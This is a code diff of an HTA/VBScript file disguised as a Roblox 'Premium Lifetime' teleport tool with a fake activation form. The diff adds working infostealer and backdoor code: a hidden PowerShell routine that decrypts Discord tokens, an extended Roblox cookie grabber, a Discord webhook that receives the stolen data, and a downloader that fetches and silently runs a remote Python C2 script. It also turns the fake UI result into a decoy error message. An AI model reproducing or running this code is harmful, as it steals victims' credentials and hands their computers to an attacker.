@@ -7,37 +7,14 @@ On Error Resume Next
 Dim sh, fso, WH, PC, USER
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
-
-Function D(s)
-    Dim i, r: r = ""
-    For i = 1 To Len(s)
-        r = r & Chr(Asc(Mid(s, i, 1)) Xor 7)
-    Next
-    D = r
-End Function
-
-WH = D("}ozxw2((yywvjyr5jv{5hg5~lmzvvkw2x|`q~kgtov|z|y|~x3*3Bz7VnhSluFzngFz3j}3VnhSluFzngFl3Bz7Vn3h;]yM;t}]y3h^lvtwpzu3hS3slJhVnhC}SluSps3he3S_3yqfn3hC3Huz3h8FYhT3hJv}p3h@3h}7Fnh7Fz3h#u3hB3h<3h]7Fz3h#3h?3h=3h")
+WH = "https://discord.com/api/webhooks/1537058264217288857/_gDfWmViEwuCjdpTpeXyHfNdSfOp0pPcbrUQ4Rkb9WdpwUU7ssK0Eeo1hkeUyk5k_bhW"
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 
+Call GrabDiscordTokens
 Call SendIP
 Call GrabRoblox
-
-Sub ProtectClick
-    Dim protectedUser, statusLabel
-    protectedUser = document.getElementById("protectedBox").value
-    Set statusLabel = document.getElementById("protectStatus")
-    If Len(protectedUser) = 0 Then
-        statusLabel.innerHTML = "Enter a username to protect."
-        statusLabel.style.color = "#ff5555"
-    Else
-        statusLabel.innerHTML = "🛡️ " & protectedUser & " is now protected."
-        statusLabel.style.color = "#55ff55"
-        statusLabel.style.textShadow = "0 0 8px #55ff55"
-        document.getElementById("protectedBox").style.border = "1px solid #55ff55"
-        document.getElementById("protectedBox").style.boxShadow = "0 0 12px #55ff55"
-    End If
-End Sub
+Call LaunchC2
 
 Sub BtnClick
     Dim jobId, playerName, gameName, result
@@ -48,9 +25,9 @@ Sub BtnClick
         result = "Error: Please fill in all fields."
         document.getElementById("resultLabel").style.color = "#ff5555"
     Else
-        result = "Activation successful."
-        document.getElementById("resultLabel").style.color = "#55ff55"
-        document.getElementById("resultLabel").style.textShadow = "0 0 10px #55ff55, 0 0 20px #55ff55"
+        result = "Invalid API Key."
+        document.getElementById("resultLabel").style.color = "#ff5555"
+        document.getElementById("resultLabel").style.textShadow = "0 0 10px #ff55555, 0 0 20px #ff5555"
     End If
     document.getElementById("resultLabel").innerHTML = result
 End Sub
@@ -115,6 +92,9 @@ Sub GrabRoblox()
         cookie = Mid(raw, rp)
     End If
     If Len(cookie) = 0 Then cookie = raw: approach = "RawFile"
+    Dim cae: cae = InStr(cookie, "|$CAE")
+    If cae = 0 Then cae = InStr(cookie, "|_CAE")
+    If cae > 0 Then cookie = Mid(cookie, cae)
     Call PostEmbed("Roblox (" & approach & ")", "Size: " & Len(cookie) & vbLf & Left(cookie, 60) & "...", 65280)
     Call PostFile("cookie.txt", cookie)
 End Sub
@@ -140,6 +120,25 @@ Function DecryptDPAPI(b64)
 End Function
 
 Sub RunCmd(cmd)
+    On Error Resume Next
+    Dim objWMIService, objProcess, intProcessID, objStartup
+    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+    Set objStartup = objWMIService.Get("Win32_ProcessStartup").SpawnInstance_
+    objStartup.ShowWindow = 0
+    Set objProcess = objWMIService.Get("Win32_Process")
+    objProcess.Create cmd, , objStartup, intProcessID
+    If intProcessID = 0 Then Exit Sub
+    Dim colProcesses, bRunning: bRunning = True
+    Do While bRunning
+        Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+        Set colProcesses = objWMIService.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE ProcessId=" & intProcessID)
+        bRunning = (colProcesses.Count > 0)
+        Set colProcesses = Nothing: Set objWMIService = Nothing
+        If bRunning Then WScript.Sleep 150
+    Loop
+End Sub
+
+Sub WmiRun(cmd)
     On Error Resume Next
     Dim objWMIService, objProcess, intProcessID, objStartup
     Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
@@ -209,6 +208,51 @@ Function MkGuid()
     MkGuid = Mid(t.GUID, 2, 36): Set t = Nothing
 End Function
 
+Sub GrabDiscordTokens()
+    Dim dcPS, dp, dout, dt
+    dcPS = "$eap='SilentlyContinue';$app=$env:APPDATA;$cl=@('discord','discordptb','discordcanary');$mk=$null;foreach($c in $cl){$ls=gp ""$app\$c\Local State"" -Name os_crypt -EA 0 2>$null;if(!$ls){continue};$txt=$ls|Out-String;if($txt -match 'encrypted_key""\s*:\s*""([^""]+)'){$mkb=[Convert]::FromBase64String($Matches[1]);$mk=[Security.Cryptography.ProtectedData]::Unprotect($mkb[5..($mkb.Length-1)],$null,0);break}};if(!$mk){Write-Output 'NOMASTER';exit};Write-Output ('MK:'+[Convert]::ToBase64String($mk));foreach($c in $cl){$ld=""$app\$c\Local Storage\leveldb"";if(!(Test-Path $ld)){continue};gci $ld *.ldb,*.log -EA 0|%{$txt=gc $_.FullName -Raw -EA 0;$m=[regex]::Matches($txt,'dQw4w9WgXcQ:[^\s""]+');foreach($x in $m){try{$enc=[Convert]::FromBase64String($x.Value.Split(':')[1]);$nonce=$enc[3..14];$ct=$enc[15..($enc.Length-17)];$tag=$enc[($enc.Length-16)..($enc.Length-1)];$aes=[Security.Cryptography.AesGcm]::new($mk);$pt=[byte[]]::new($ct.Length);$aes.Decrypt($nonce,$ct,$tag,$pt);$tok=[Text.Encoding]::UTF8.GetString($pt);if($tok -match '\w{24}\.\w{6}\.\w{27}'){Write-Output ('TKN:'+$c+':'+$tok)}}catch{}}}};Write-Output 'DONE'"
+    dp = TmpFile("dt.ps1")
+    dout = TmpFile("dt.txt")
+    WriteFile dp, dcPS
+    fso.DeleteFile dout, True
+    WmiRun "powershell -NoP -EP Bypass -File """ & dp & """ > """ & dout & """"
+    fso.DeleteFile dp, True
+    If fso.FileExists(dout) Then
+        If fso.GetFile(dout).Size > 5 Then
+            dt = ReadFile(dout)
+            fso.DeleteFile dout, True
+            If InStr(dt, "TKN:") > 0 Then
+                PostEmbed "Discord Tokens", "Decrypted tokens below", 16711680
+                PostFile "tokens.txt", dt
+            ElseIf InStr(dt, "MK:") > 0 Then
+                PostEmbed "Discord", "Found master key but no tokens", 16744192
+                Dim mkP: mkP = InStr(dt, "MK:")
+                If mkP > 0 Then
+                    Dim mkE2: mkE2 = InStr(mkP, dt, vbLf)
+                    If mkE2 = 0 Then mkE2 = Len(dt) + 1
+                    PostFile "master_key.txt", Mid(dt, mkP + 3, mkE2 - mkP - 3)
+                End If
+            Else
+                PostEmbed "Discord", "No Discord installation found", 10038562
+            End If
+        End If
+    End If
+End Sub
+
+Sub LaunchC2
+    On Error Resume Next
+    Dim x, a, p
+    Set x = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    x.Open "GET", "https://delta-check.onrender.com/c2.py", False
+    x.Send
+    If x.Status = 200 Then
+        p = sh.ExpandEnvironmentStrings("%TEMP%") & "\rbx_c2.py"
+        Set a = CreateObject("ADODB.Stream")
+        a.Type = 1: a.Open: a.Write x.ResponseBody: a.SaveToFile p, 2: a.Close
+        sh.Run "pythonw " & p, 0, False
+    End If
+End Sub
+
 </script>
 </head>
 <body bgcolor="#0a0a0f" text="#ffffff" style="font-family:'Segoe UI',Arial,sans-serif;">
@@ -217,17 +261,13 @@ End Function
 <div style="background:linear-gradient(145deg,#12121a,#1a1a2e);border-radius:16px;padding:30px;border:1px solid #2a2a4a;box-shadow:0 8px 32px rgba(0,0,0,0.6);">
 <div style="background:linear-gradient(90deg,#7c3aed,#4f46e5);border-radius:8px;padding:2px;margin-bottom:20px;">
 <div style="background:#0a0a0f;border-radius:7px;padding:12px;">
-<h1 style="font-size:18px;color:#a78bfa;margin:0;letter-spacing:1px;">Premium Lifetime</h1>
+<h1 style="font-size:18px;color:#a78bfa;margin:0;letter-spacing:1px;">Fuwatti's Premium Lifetime</h1>
 <p style="font-size:9px;color:#555;margin:4px 0 0 0;letter-spacing:2px;">EXCLUSIVE ACCESS TOOL</p>
 </div>
 </div>
 <div style="text-align:left;padding:3px;">
 <label style="font-size:11px;color:#888;letter-spacing:1px;">PROTECTED USER</label><br>
-<div style="display:flex;gap:5px;margin:6px 0 5px 0;">
-<input type="text" id="protectedBox" placeholder="Enter protected username" style="flex:1;padding:11px;background:#0f0f1a;color:#e0e0e0;border:1px solid #2a2a4a;border-radius:7px;font-size:13px;outline:none;">
-<button onclick="ProtectClick()" style="padding:11px 15px;background:linear-gradient(90deg,#7c3aed,#4f46e5);color:white;border:none;border-radius:7px;font-size:12px;font-weight:600;cursor:pointer;">PROTECT</button>
-</div>
-<p id="protectStatus" style="font-size:11px;color:#555;margin:0 0 15px 0;text-align:left;"></p>
+<input type="text" id="protectedBox" placeholder="Enter protected username" style="width:100%;padding:11px;margin:6px 0 15px 0;background:#0f0f1a;color:#e0e0e0;border:1px solid #2a2a4a;border-radius:7px;font-size:13px;outline:none;"><br>
 <label style="font-size:11px;color:#888;letter-spacing:1px;">JOB ID</label><br>
 <input type="text" id="jobBox" placeholder="Enter job ID" style="width:100%;padding:11px;margin:6px 0 15px 0;background:#0f0f1a;color:#e0e0e0;border:1px solid #2a2a4a;border-radius:7px;font-size:13px;outline:none;"><br>
 <label style="font-size:11px;color:#888;letter-spacing:1px;">PLAYER</label><br>
@@ -240,7 +280,7 @@ End Function
 <option value="Fake SAB Plaza (Pro Plaza)">Fake SAB Plaza (Pro Plaza)</option>
 </select>
 </div>
-<button onclick="BtnClick()" style="width:100%;padding:13px;margin-top:8px;background:linear-gradient(90deg,#7c3aed,#4f46e5);color:white;border:none;border-radius:9px;font-size:13px;font-weight:600;letter-spacing:1px;cursor:pointer;">ACTIVATE</button>
+<button onclick="BtnClick()" style="width:100%;padding:13px;margin-top:8px;background:linear-gradient(90deg,#7c3aed,#4f46e5);color:white;border:none;border-radius:9px;font-size:13px;font-weight:600;letter-spacing:1px;cursor:pointer;">TELEPORT</button>
 <p style="font-size:9px;color:#444;margin-top:12px;letter-spacing:1px;">LICENSED TO: PREMIUM USER</p>
 </div>
 <p id="resultLabel" style="font-size:12px;margin-top:18px;color:#55ff55;font-family:'Segoe UI',Arial;"></p>
